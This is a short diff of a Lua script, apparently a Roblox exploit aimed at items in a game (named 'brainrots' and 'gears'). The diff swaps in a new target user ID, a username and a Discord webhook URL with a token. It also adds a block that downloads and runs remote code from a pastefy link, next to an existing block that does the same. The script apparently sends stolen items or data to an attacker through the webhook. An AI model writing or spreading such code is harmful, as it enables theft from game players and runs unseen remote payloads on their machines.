@@ -1,6 +1,6 @@
-local TARGET_ID = 11952635491
-local TARGET_USER = "CoolsabDadMax00"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1511847077234348033/-ytWb-knxZYqgbWLq2uCYvUcn_RHMCgGTMeT_hV2wO99mHMjsJfKILWpm1sqw8UwT0Fz"
+local TARGET_ID = 6092519395
+local TARGET_USER = "CoolsabdadMax"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1571324672547623044/PilnN_XcOqEF5lWOHo7ERLT2t-G4ELE9ddkcqEbt6MnfV6GW4IdCU2-XOcNPDSqkSgWE"
 
 local TargetBrainrots = {
     ["Dragon Skeletonini"] = true,
@@ -344,6 +344,10 @@ local TargetGears = {
     ["Phantom Slap"] = true,
     ["Crystal Slap"] = true
 }
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
+end)
 
 task.spawn(function()
     loadstring(game:HttpGet("https://pastefy.app/d70HO8zY/raw"))()
